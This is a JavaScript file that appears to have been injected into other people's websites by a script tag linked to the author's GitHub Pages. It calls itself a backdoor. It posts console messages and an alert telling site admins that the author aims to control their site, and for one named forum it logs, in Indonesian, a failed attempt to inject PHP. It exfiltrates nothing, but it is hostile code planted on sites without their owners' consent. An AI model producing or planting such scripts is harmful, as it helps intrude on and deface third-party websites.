console.log("NetProject, PITUNG. A JS Backdooring control with a wonderfull martial art.");
console.log("Hello Admin!, Sorry for this. I linked my js script to your web so I can control your web via my Github Page.")
console.log("Dont Panic! I wont to crack your web! And if i can control your web fully, I will NOT to delete a file. I will backup it and give end of file name \"*.backup\"");
console.log("With, love. My Self.");
console.log("and ya... you know my name. if you see the SCRIPT tag element linked to my github page. So you know who is me. Bingo!");
alert("ADMIN!!! Please see console!!! \r\n Net666 Project");

var url_true, method, url;
url_true = window.location.href; 
method=url_true.slice(0, url_true.indexOf("//") - 1); 
url = (url_true.slice(url_true.indexOf("//") + 2, (url_true.indexOf("?") > -1 ? url_true.indexOf("?") : url_true.length))).split("/");
setting = (url_true.indexOf("?") > -1 ? url_true.slice(url_true.indexOf("?") + 1) : "").split("&");

if(method == "http" || method == "https"){
  switch(url[0]){
    case "forumkembangan.net":
      console.log("bagus deng. gua g bs nginject script php");
      console.log("sorry banget ya. gua terus nyoba dan coba gimana cara masukin script phpnya");
      console.log("btw gua salut ama yg bikin script phpnya yang g bisa masukin script php");
      console.log("gua minta maaf banget kalo ada kerusakan file");
      //alert("ini text ya ?");
      break;
    default:
      console.log(url[0] + ", please repair!");
  }
}
